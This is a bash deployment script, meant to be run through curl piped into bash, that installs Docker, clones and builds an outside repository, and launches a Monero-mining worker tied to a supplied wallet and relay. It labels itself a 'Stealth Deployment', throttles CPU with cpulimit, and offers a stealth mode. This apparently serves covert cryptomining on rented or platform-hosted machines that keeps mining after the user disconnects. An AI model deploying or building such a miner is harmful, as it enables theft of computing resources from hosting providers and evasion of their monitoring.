#!/bin/bash

# Lumen VPS One-Click Deployer
# Usage: curl -s ... | bash -s -- --wallet <ADDR> --relay <URL> --turbo <true/false>

set -e

# Default values
WALLET=""
RELAY=""
TURBO="false"
WORKER_NAME="lumen-vps-$(hostname)"

# Parse arguments
while [[ "$#" -gt 0 ]]; do
    case $1 in
        --wallet) WALLET="$2"; shift ;;
        --relay) RELAY="$2"; shift ;;
        --turbo) TURBO="$2"; shift ;;
        --name) WORKER_NAME="$2"; shift ;;
    esac
    shift
done

if [ -z "$WALLET" ] || [ -z "$RELAY" ]; then
    echo "Error: --wallet and --relay are required."
    exit 1
fi

echo "[*] Starting Lumen Stealth Deployment on $(hostname)..."

# 1. Install dependencies
echo "[*] Installing system dependencies..."
sudo apt-get update -y
sudo apt-get install -y docker.io docker-compose cpulimit git

# 2. Clone repository
echo "[*] Cloning Lumen repository..."
rm -rf lumen-deploy
git clone https://github.com/naia231/naira.git lumen-deploy
cd lumen-deploy

# 3. Create .env file
echo "[*] Configuring environment..."
cat <<EOF > .env
XMR_WALLET=$WALLET
RELAY_URL=$RELAY
ARC_TURBO=$TURBO
WORKER_NAME=$WORKER_NAME
PORT=8080
EOF

# 4. Build and Launch
echo "[*] Building and launching Lumen Swarm..."
sudo docker-compose -f paas-worker/docker-compose.yml up -d --build

echo ""
echo "===================================================="
echo "   DEPLOYMENT COMPLETE"
echo "   Worker Name: $WORKER_NAME"
echo "   Mode: $( [ "$TURBO" = "true" ] && echo "TURBO" || echo "STEALTH" )"
echo "   Dashboard: http://$(curl -s ifconfig.me):8080"
echo "===================================================="
echo "[*] You can now disconnect. Mining is running in background."
